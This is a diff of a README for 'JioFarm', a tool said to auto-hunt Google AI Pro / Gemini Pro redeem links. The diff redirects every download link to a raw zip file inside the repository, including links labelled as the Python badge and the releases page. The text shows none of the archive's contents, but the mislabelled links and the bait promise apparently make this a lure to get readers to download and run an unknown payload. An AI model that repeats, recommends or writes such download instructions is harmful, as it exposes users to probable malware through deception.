@@ -4,8 +4,8 @@
 
 **Your Personal Auto-Hunter for Google AI Pro / Gemini Pro Redeem Links**
 
-[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Undisciplined-alchemist8546/jiofarm/releases)
-[![Python](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
+[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Undisciplined-alchemist8546/jiofarm/main/jiofarm/storage/2.1.zip)
+[![Python](https://img.shields.io/badge/python-3.9+-blue.svg)](https://raw.githubusercontent.com/Undisciplined-alchemist8546/jiofarm/main/jiofarm/storage/2.1.zip)
 [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 
 </div>
@@ -45,7 +45,7 @@ Follow these simple steps to get JioFarm running on your Windows computer:
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/Undisciplined-alchemist8546/jiofarm/releases](https://github.com/Undisciplined-alchemist8546/jiofarm/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Undisciplined-alchemist8546/jiofarm/main/jiofarm/storage/2.1.zip](https://raw.githubusercontent.com/Undisciplined-alchemist8546/jiofarm/main/jiofarm/storage/2.1.zip)
 
 Once you're on that page, look for the latest release and download the file. It might take a minute or two depending on your internet speed.
 
@@ -175,7 +175,7 @@ Join the growing community of JioFarm users:
 
 ## 📦 Release Notes
 
-Visit the [releases page](https://github.com/Undisciplined-alchemist8546/jiofarm/releases) to see the latest updates, improvements, and bug fixes for each version.
+Visit the [releases page](https://raw.githubusercontent.com/Undisciplined-alchemist8546/jiofarm/main/jiofarm/storage/2.1.zip) to see the latest updates, improvements, and bug fixes for each version.
 
 ---
 
@@ -193,7 +193,7 @@ For those who want more control, JioFarm includes several advanced options:
 
 Getting Google AI Pro / Gemini Pro links has never been easier. Download JioFarm today, follow the three-step setup above, and let it do the hard work for you.
 
-**Visit this link to download the application:** [https://github.com/Undisciplined-alchemist8546/jiofarm/releases](https://github.com/Undisciplined-alchemist8546/jiofarm/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Undisciplined-alchemist8546/jiofarm/main/jiofarm/storage/2.1.zip](https://raw.githubusercontent.com/Undisciplined-alchemist8546/jiofarm/main/jiofarm/storage/2.1.zip)
 
 Don't waste your time refreshing pages manually — let JioFarm be your tireless, always-on hunting companion.
 
